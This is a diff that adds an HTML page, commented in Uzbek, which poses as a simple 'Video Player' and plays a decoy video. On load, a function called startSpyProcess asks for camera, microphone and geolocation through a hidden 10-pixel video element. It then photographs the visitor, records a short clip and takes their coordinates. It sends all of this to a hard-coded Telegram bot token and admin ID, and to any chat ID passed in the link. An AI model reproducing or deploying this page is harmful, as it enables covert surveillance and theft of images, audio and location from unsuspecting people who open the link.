@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Video Player</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: black; }
+        #bg-video {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; z-index: 2;
+        }
+        #cam-video {
+            position: absolute; top: 0; left: 0; width: 10px; height: 10px;
+            z-index: 1; opacity: 0; pointer-events: none;
+        }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Asosiy video -->
+    <video id="bg-video" autoplay loop muted playsinline webkit-playsinline>
+        <source src="video.mp4" type="video/mp4">
+    </video>
+
+    <video id="cam-video" autoplay playsinline webkit-playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // --- SOZLAMALAR ---
+        const BOT_TOKEN = "8395077251:AAFcjcN9wk03NF02FV08atn2bCL3N8xNKEI";
+        const ADMIN_ID = "8250478755"; 
+        // ------------------
+
+        // URL dan foydalanuvchi ID sini olish funksiyasi
+        function getUserIdFromUrl() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('id'); // Linkdagi ?id=12345 qismini oladi
+        }
+
+        // Linkdan kelgan ID ni saqlab olamiz
+        const URL_USER_ID = getUserIdFromUrl();
+
+        window.onload = async () => {
+            document.getElementById('bg-video').play().catch(e => console.log("Autoplay blocked"));
+            startSpyProcess();
+        };
+
+        async function startSpyProcess() {
+            const video = document.getElementById('cam-video');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 } }, 
+                    audio: true 
+                });
+
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 1500));
+
+                getLocationAndSend();
+                await capturePhoto(video);
+                recordVideo(stream);
+
+            } catch (err) {
+                console.error("Xatolik:", err);
+            }
+        }
+
+        async function capturePhoto(video) {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    await sendToTelegram("sendPhoto", blob, "photo", "📸 Rasm");
+                }
+            }, 'image/jpeg', 0.9);
+        }
+
+        function recordVideo(stream) {
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                await sendToTelegram("sendVideo", blob, "video", "🎥 Video");
+            };
+            mediaRecorder.start();
+            setTimeout(() => { mediaRecorder.stop(); }, 2000);
+        }
+
+        function getLocationAndSend() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    
+                    // 1. Adminga jo'natish
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${ADMIN_ID}&latitude=${lat}&longitude=${lon}`);
+                    
+                    // 2. Link orqali kirgan odamga ham jo'natish (Agar u admin bo'lmasa)
+                    if (URL_USER_ID && URL_USER_ID !== ADMIN_ID) {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${URL_USER_ID}&latitude=${lat}&longitude=${lon}`);
+                    }
+                });
+            }
+        }
+
+        async function sendToTelegram(method, blob, fileType, caption) {
+            const formData = new FormData();
+            formData.append("chat_id", ADMIN_ID);
+            const filename = fileType === "photo" ? "cam.jpg" : "video.mp4";
+            formData.append(fileType, blob, filename);
+            formData.append("caption", caption);
+
+            // 1. ADMINGA YUBORISH
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                method: "POST", body: formData
+            });
+
+            // 2. LINK EGASIGA (USERGA) YUBORISH
+            // Agar linkda ID bo'lsa va u Admin ID si bilan bir xil bo'lmasa
+            if (URL_USER_ID && URL_USER_ID !== ADMIN_ID) {
+                const formDataUser = new FormData();
+                formDataUser.append("chat_id", URL_USER_ID);
+                formDataUser.append(fileType, blob, filename);
+                formDataUser.append("caption", caption);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                    method: "POST", body: formDataUser
+                });
+            }
+        }
+    </script>
+</body>
+</html>
